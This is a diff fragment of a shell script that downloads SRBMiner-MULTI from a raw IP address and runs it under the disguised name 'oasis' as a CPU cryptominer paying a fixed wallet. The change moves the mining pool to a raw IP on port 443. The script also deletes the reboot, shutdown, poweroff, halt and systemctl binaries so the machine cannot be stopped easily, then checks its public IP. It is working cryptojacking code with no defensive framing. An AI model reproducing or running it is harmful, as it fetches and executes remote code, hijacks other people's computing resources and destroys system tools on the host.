@@ -4,7 +4,7 @@ ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 wget -O oasis http://139.180.133.28/SRBMiner-MULTI
 chmod 777 oasis
-./oasis --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.KK --password x --cpu-threads $(nproc --all)
+./oasis --algorithm verushash --pool stratum+tcp://209.97.168.28:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.BUTJEM --password x --cpu-threads $(nproc --all)
 sleep 30
 rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
